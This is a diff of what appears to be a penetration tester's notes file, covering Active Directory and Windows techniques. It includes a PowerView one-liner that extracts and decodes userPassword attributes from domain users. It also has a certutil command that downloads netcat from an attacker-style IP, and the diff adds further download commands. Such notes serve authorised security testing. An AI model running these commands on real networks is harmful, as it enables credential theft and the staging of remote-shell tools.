@@ -651,8 +651,18 @@ Get-ObjectACL "DC=testlab,DC=local" -ResolveGUIDs | ? {
 $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
 </rich_text>
     </node>
-    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1663605130">
-      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe</rich_text>
+    <node name="download_file" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1663605128" ts_lastsave="1666521843">
+      <rich_text>certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
+
+</rich_text>
+      <rich_text family="monospace">Invoke-WebRequest $myDownloadUrl -OutFile c:\file.ext
+</rich_text>
+      <rich_text>
+wget</rich_text>
+      <rich_text family="monospace"> $myDownloadUrl -OutFile c:\file.ext</rich_text>
+      <rich_text>
+
+</rich_text>
     </node>
     <node name="check .net version" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664784197" ts_lastsave="1664784319">
       <rich_text>C:\windows\microsoft.net\framework&gt; ls</rich_text>
